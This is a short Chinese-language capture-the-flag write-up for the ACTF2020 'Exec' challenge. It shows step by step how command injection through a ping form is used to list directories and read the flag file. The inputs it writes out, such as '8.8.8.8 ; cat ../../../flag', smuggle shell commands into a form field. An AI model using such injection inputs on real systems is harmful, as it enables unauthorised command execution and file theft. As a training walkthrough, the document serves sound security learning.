# [ACTF2020 新生赛]Exec


# [ACTF2020 新生赛]Exec

访问靶机：

![[ACTF2020 新生赛]Exec-1](https://pic.imgdb.cn/item/6534ac6bc458853aef147e63.jpg)

输入`8.8.8.8`，点击PING

![[ACTF2020 新生赛]Exec-2](https://pic.imgdb.cn/item/6534acc7c458853aef15c54f.jpg)

输入`8.8.8.8 & ipconfig`，从结果来看没有执行`ipconfig`

![[ACTF2020 新生赛]Exec-3](https://pic.imgdb.cn/item/6534b0d1c458853aef2449b3.jpg)

输入`8.8.8.8 ; ifconfig`，从结果来看执行了`ifconfig`

![[ACTF2020 新生赛]Exec-4](https://pic.imgdb.cn/item/6534b12ac458853aef257724.jpg)

对比以上两条命令可知：

- 该页面存在RCE漏洞
- 服务器为Linux系统

输入`8.8.8.8 ; ls`，看到当前目录下只有一个`index.php`

![[ACTF2020 新生赛]Exec-5](https://pic.imgdb.cn/item/6534b216c458853aef28a7be.jpg)

输入`8.8.8.8 ; ls ..`，也没找到flag文件

![[ACTF2020 新生赛]Exec-6](https://pic.imgdb.cn/item/6534b277c458853aef29ea70.jpg)

以此类推，一直往上级目录查询，直到输入`8.8.8.8 ; ls ../../..`，找到flag文件

![[ACTF2020 新生赛]Exec-7](https://pic.imgdb.cn/item/6534b300c458853aef2bcf6a.jpg)

输入`8.8.8.8 ; cat ../../../flag`，得到flag

![[ACTF2020 新生赛]Exec-8](https://pic.imgdb.cn/item/6534b39ec458853aef2df824.jpg)
